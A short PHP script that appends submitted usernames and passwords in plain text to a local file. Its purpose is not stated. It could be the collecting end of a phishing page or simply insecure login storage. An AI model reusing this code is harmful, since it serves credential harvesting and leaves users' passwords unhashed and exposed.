<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve the submitted username and password
    $username = $_POST["username"];
    $password = $_POST["password"];

    $file = "/Q3/user_data.txt"; // Replace with your actual absolute path
    $fp = fopen($file, "a");
    fwrite($fp, $username . ", " . $password . "\n");
    fclose($fp);
}
?>
